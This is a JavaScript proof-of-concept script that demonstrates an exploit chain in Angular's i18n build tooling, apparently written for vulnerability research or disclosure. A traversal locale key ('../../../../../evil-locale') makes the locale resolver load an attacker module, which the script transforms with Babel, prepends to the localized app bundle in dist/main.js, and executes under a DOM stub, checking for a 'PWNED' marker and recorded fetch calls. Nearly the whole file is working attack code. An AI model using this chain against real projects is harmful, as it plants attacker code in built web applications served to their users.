// C4A — Chain 4 full demo: malicious locale key -> findLocaleDataPath -> Babel transform
// -> unshifted into the localized app chunk (exact process-bundle.ts embedding) -> browser execution.
import { createRequire } from 'node:module';
import path from 'node:path';
import fs from 'node:fs';
import { createRequire as _cr } from 'node:module';

const projectRoot = path.join(import.meta.dirname, 'project');
const ATTCK = path.join(import.meta.dirname, 'evil-locale.js');

// === HOP 1: i18n-webpack.ts:52-58 verbatim resolution ===
const LOCALE_DATA_BASE_MODULE = '@angular/common/locales/global';
const projectRequire = createRequire(projectRoot + '/');
const localeResolver = (locale) => projectRequire.resolve(path.join(LOCALE_DATA_BASE_MODULE, locale));

// === HOP 2: findLocaleDataPath (i18n-webpack.ts:135-143 verbatim) ===
function findLocaleDataPath(locale, resolver) {
  const scrubbedLocale = locale.replace(/-x(-[a-zA-Z0-9]{1,8})+$/, '');
  try { return resolver(scrubbedLocale); }
  catch { return scrubbedLocale === 'en-US' ? findLocaleDataPath('en', resolver) : null; }
}

// Malicious locale key: 5 levels up escapes the package to the attacker module (empirically verified)
const MAL_KEY = '../../../../../evil-locale';
const localeDataPath = findLocaleDataPath(MAL_KEY, localeResolver);
console.log('[HOP2] malicious key', JSON.stringify(MAL_KEY), '-> resolved dataPath:', localeDataPath);
console.log('[HOP2] is attacker module?', localeDataPath === ATTCK);
if (localeDataPath !== ATTCK) { console.log('[FAIL] resolution did not reach the attacker module'); process.exit(1); }

// Control: benign locale resolves inside the real package
const ctl = findLocaleDataPath('en', localeResolver);
console.log('[CTRL] benign en ->', ctl, '| inside package?', ctl && ctl.includes('@angular/common'));

// === HOP 3: loadLocaleData (process-bundle.ts:373-390 verbatim: read + Babel preset-env, esmodules, minified) ===
const { transformAsync } = await import(path.join(import.meta.dirname, 'node_modules', '@babel', 'core', 'index.js'));
const content = fs.readFileSync(localeDataPath, 'utf8');
const { code: localeDataContent } = await transformAsync(content, {
  filename: localeDataPath,
  inputSourceMap: false,
  babelrc: false,
  configFile: false,
  presets: [[path.join(import.meta.dirname, 'node_modules', '@babel', 'preset-env'), { targets: { esmodules: true } }]],
  minified: true,
});
console.log('[HOP3] transformed attacker content:', JSON.stringify(localeDataContent.slice(0, 120)) + '...');

// === HOP 4: createI18nPlugins embedding (process-bundle.ts:87-91 verbatim: unshiftContainer Program body) ===
const templateMod = await import(path.join(import.meta.dirname, 'node_modules', '@babel', 'template', 'index.js'));
const templateBuilder = templateMod.default ?? templateMod;
const appChunk = `// Angular app chunk (localized)\nvar App = function () { return { bootstrap: function () { console.log('APP-BOOT'); } }; };`;
const { parseSync, transformFromAstSync } = await import(path.join(path.join(import.meta.dirname, 'node_modules', '@babel'), 'core', 'index.js'));
const ast = parseSync(appChunk, { filename: 'main.js' });
ast.program.body.unshift(...templateBuilder.ast(localeDataContent).program.body);
const { code: localizedChunk } = transformFromAstSync(ast, appChunk, { filename: 'main.js', babelrc: false, configFile: false, compact: true });
fs.writeFileSync(path.join(import.meta.dirname, 'dist', 'main.js'), localizedChunk);
console.log('[HOP4] localized chunk written to dist/main.js');

// === HOP 5: browser execution (DOM-less stub) ===
console.log('--- running dist/main.js with DOM stub ---');
const calls = [];
const window = {};
const document = { title: 'original-title' };
globalThis.window = window;
globalThis.document = document;
globalThis.fetch = (url) => { calls.push(url); return Promise.resolve({ ok: true }); };
await import('node:url'); // noop for module cache
const chunkSrc = fs.readFileSync(path.join(import.meta.dirname, 'dist', 'main.js'), 'utf8');
await (0, eval)(chunkSrc);  // execute the chunk (browser-style global scope)
console.log('[HOP5] window.__chain4 =', window.__chain4);
console.log('[HOP5] document.title =', document.title);
console.log('[HOP5] fetch calls =', JSON.stringify(calls));
console.log('[HOP5] APP marker present =', window.__chain4 === 'CHAIN4-PWNED-9f3c1e');
